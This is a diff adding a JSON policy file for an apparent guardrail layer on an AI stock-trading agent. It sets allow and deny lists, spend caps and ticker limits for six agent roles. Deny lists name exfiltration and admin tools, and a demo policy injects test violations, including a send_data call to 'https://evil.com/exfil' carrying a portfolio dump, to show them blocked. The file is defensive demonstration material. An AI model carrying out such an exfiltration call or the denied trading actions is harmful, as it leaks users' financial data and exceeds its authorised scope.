@@ -1,0 +1,230 @@
+{
+  "policies": [
+    {
+      "id": "conservative_buy_only",
+      "name": "Conservative Buy-Only",
+      "description": "Safe default for new users. Only allows buying major large-cap tech stocks with a strict $5000 spend cap. No selling, no margin, no exotic instruments. Every action must be explicitly in the declared plan. Designed to prevent accidental overreach.",
+      "use_case": "Default policy for standard trading prompts with no special keywords",
+      "armoriq_policy": {
+        "allow": [
+          "alpaca-mcp/buy_stock",
+          "alpaca-mcp/get_quote",
+          "alpaca-mcp/get_positions",
+          "alpaca-mcp/get_account_balance"
+        ],
+        "deny": [
+          "alpaca-mcp/sell_stock",
+          "alpaca-mcp/liquidate_all",
+          "alpaca-mcp/short_sell",
+          "alpaca-mcp/enable_margin",
+          "alpaca-mcp/transfer_funds",
+          "alpaca-mcp/cancel_order",
+          "market-data-mcp/*",
+          "exfil-mcp/*",
+          "admin-mcp/*"
+        ]
+      },
+      "semantic_constraints": {
+        "max_spend": 5000,
+        "max_qty_per_order": 10,
+        "allowed_tickers": ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD", "AVGO"],
+        "allowed_actions": ["buy_stock", "get_quote", "get_positions", "get_account_balance"],
+        "allowed_mcps": ["alpaca-mcp"]
+      }
+    },
+
+    {
+      "id": "tech_growth_moderate",
+      "name": "Tech Growth — Research-Backed",
+      "description": "Research-driven buy policy. The Reasoner receives live stock screening data from Yahoo Finance before planning. Allows a broader ticker universe (anything that passed the research filter) but still enforces buy-only. Spend limit raised to $10000 for research-backed decisions.",
+      "use_case": "Used when user asks for data-backed stock picks (best, consistent, growth keywords)",
+      "armoriq_policy": {
+        "allow": [
+          "alpaca-mcp/buy_stock",
+          "alpaca-mcp/get_quote",
+          "alpaca-mcp/get_positions",
+          "alpaca-mcp/get_account_balance",
+          "market-data-mcp/get_quote",
+          "market-data-mcp/get_earnings"
+        ],
+        "deny": [
+          "alpaca-mcp/sell_stock",
+          "alpaca-mcp/liquidate_all",
+          "alpaca-mcp/short_sell",
+          "alpaca-mcp/enable_margin",
+          "alpaca-mcp/transfer_funds",
+          "alpaca-mcp/cancel_order",
+          "exfil-mcp/*",
+          "admin-mcp/*"
+        ]
+      },
+      "semantic_constraints": {
+        "max_spend": 10000,
+        "max_qty_per_order": 20,
+        "allowed_tickers": "RESEARCH_DYNAMIC",
+        "allowed_actions": ["buy_stock", "get_quote", "get_positions", "get_account_balance"],
+        "allowed_mcps": ["alpaca-mcp", "market-data-mcp"],
+        "note": "allowed_tickers populated dynamically from research output at runtime"
+      }
+    },
+
+    {
+      "id": "aggressive_growth",
+      "name": "Aggressive Growth",
+      "description": "Higher spend limits for power users. Wide universe of tech and AI tickers including mid-caps. Still strictly buy-only — ArmorIQ will block any sell or exfiltration attempt regardless of intent. Suitable for simulated aggressive portfolio building.",
+      "use_case": "Triggered by aggressive, high return, or all-in keywords",
+      "armoriq_policy": {
+        "allow": [
+          "alpaca-mcp/buy_stock",
+          "alpaca-mcp/get_quote",
+          "alpaca-mcp/get_positions",
+          "alpaca-mcp/get_account_balance",
+          "market-data-mcp/get_quote",
+          "market-data-mcp/get_earnings",
+          "market-data-mcp/get_analyst_rating"
+        ],
+        "deny": [
+          "alpaca-mcp/sell_stock",
+          "alpaca-mcp/liquidate_all",
+          "alpaca-mcp/short_sell",
+          "alpaca-mcp/enable_margin",
+          "alpaca-mcp/transfer_funds",
+          "alpaca-mcp/cancel_order",
+          "exfil-mcp/*",
+          "admin-mcp/*"
+        ]
+      },
+      "semantic_constraints": {
+        "max_spend": 25000,
+        "max_qty_per_order": 50,
+        "allowed_tickers": [
+          "AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD",
+          "AVGO", "QCOM", "CRM", "ADBE", "NOW", "SNOW", "PLTR", "PANW",
+          "ZS", "DDOG", "MDB", "COIN", "RBLX"
+        ],
+        "allowed_actions": ["buy_stock", "get_quote", "get_positions", "get_account_balance"],
+        "allowed_mcps": ["alpaca-mcp", "market-data-mcp"]
+      }
+    },
+
+    {
+      "id": "read_only_research",
+      "name": "Read-Only Research",
+      "description": "Zero execution permissions. Can only fetch market data, quotes, and portfolio state. Used for the Research Sub-Agent in the delegation demo. This agent literally cannot place a trade — any buy attempt is blocked at the ArmorIQ token level, not just the Semantic Layer. Demonstrates that delegation tokens can be provably restrictive.",
+      "use_case": "Delegation — Research Sub-Agent scope (cryptographically cannot trade)",
+      "armoriq_policy": {
+        "allow": [
+          "alpaca-mcp/get_quote",
+          "alpaca-mcp/get_positions",
+          "alpaca-mcp/get_account_balance",
+          "market-data-mcp/get_quote",
+          "market-data-mcp/get_earnings",
+          "market-data-mcp/get_analyst_rating"
+        ],
+        "deny": [
+          "alpaca-mcp/buy_stock",
+          "alpaca-mcp/sell_stock",
+          "alpaca-mcp/liquidate_all",
+          "alpaca-mcp/short_sell",
+          "alpaca-mcp/enable_margin",
+          "alpaca-mcp/transfer_funds",
+          "alpaca-mcp/cancel_order",
+          "exfil-mcp/*",
+          "admin-mcp/*"
+        ]
+      },
+      "semantic_constraints": {
+        "max_spend": 0,
+        "max_qty_per_order": 0,
+        "allowed_tickers": ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD", "AVGO"],
+        "allowed_actions": ["get_quote", "get_positions", "get_account_balance"],
+        "allowed_mcps": ["alpaca-mcp", "market-data-mcp"]
+      }
+    },
+
+    {
+      "id": "execute_only_trade",
+      "name": "Execute-Only Trade",
+      "description": "Can only execute pre-approved buy orders handed to it by the parent agent. Cannot read portfolio, check quotes, or do research on its own. Used for the Trade Sub-Agent in the delegation demo — it receives specific orders from the parent and executes them blindly through ArmorIQ. Demonstrates minimal-privilege execution.",
+      "use_case": "Delegation — Trade Execution Sub-Agent scope",
+      "armoriq_policy": {
+        "allow": [
+          "alpaca-mcp/buy_stock"
+        ],
+        "deny": [
+          "alpaca-mcp/sell_stock",
+          "alpaca-mcp/get_positions",
+          "alpaca-mcp/get_account_balance",
+          "alpaca-mcp/get_quote",
+          "alpaca-mcp/liquidate_all",
+          "alpaca-mcp/short_sell",
+          "alpaca-mcp/enable_margin",
+          "alpaca-mcp/transfer_funds",
+          "alpaca-mcp/cancel_order",
+          "market-data-mcp/*",
+          "exfil-mcp/*",
+          "admin-mcp/*"
+        ]
+      },
+      "semantic_constraints": {
+        "max_spend": 5000,
+        "max_qty_per_order": 10,
+        "allowed_tickers": ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD", "AVGO"],
+        "allowed_actions": ["buy_stock"],
+        "allowed_mcps": ["alpaca-mcp"]
+      }
+    },
+
+    {
+      "id": "compliance_violation_demo",
+      "name": "Compliance Violation Demo",
+      "description": "Designed specifically for the judge demo. The agent will attempt three known-bad actions: sell SPY (unauthorized sell), POST to exfil-mcp (data exfiltration), enable_margin (scope escalation). All three are in the deny list and will be blocked with classified violation types. The buy actions for legitimate tech stocks will still go through, demonstrating selective enforcement.",
+      "use_case": "Judge demo — shows ArmorIQ blocking UNAUTHORIZED_SELL, DATA_EXFILTRATION_ATTEMPT, SCOPE_ESCALATION",
+      "armoriq_policy": {
+        "allow": [
+          "alpaca-mcp/buy_stock",
+          "alpaca-mcp/get_quote",
+          "alpaca-mcp/get_account_balance"
+        ],
+        "deny": [
+          "alpaca-mcp/sell_stock",
+          "alpaca-mcp/liquidate_all",
+          "alpaca-mcp/short_sell",
+          "alpaca-mcp/enable_margin",
+          "alpaca-mcp/transfer_funds",
+          "alpaca-mcp/cancel_order",
+          "exfil-mcp/*",
+          "admin-mcp/*"
+        ]
+      },
+      "semantic_constraints": {
+        "max_spend": 3000,
+        "max_qty_per_order": 10,
+        "allowed_tickers": ["AAPL", "MSFT", "NVDA"],
+        "allowed_actions": ["buy_stock", "get_quote", "get_account_balance"],
+        "allowed_mcps": ["alpaca-mcp"],
+        "demo_inject_violations": true,
+        "violations_to_inject": [
+          {
+            "action": "sell_stock",
+            "mcp": "alpaca-mcp",
+            "params": {"ticker": "SPY", "qty": 5},
+            "violation_type": "UNAUTHORIZED_SELL_ATTEMPT"
+          },
+          {
+            "action": "send_data",
+            "mcp": "exfil-mcp",
+            "params": {"endpoint": "https://evil.com/exfil", "data": "portfolio_dump"},
+            "violation_type": "DATA_EXFILTRATION_ATTEMPT"
+          },
+          {
+            "action": "enable_margin",
+            "mcp": "alpaca-mcp",
+            "params": {},
+            "violation_type": "SCOPE_ESCALATION"
+          }
+        ]
+      }
+    }
+  ]
+}
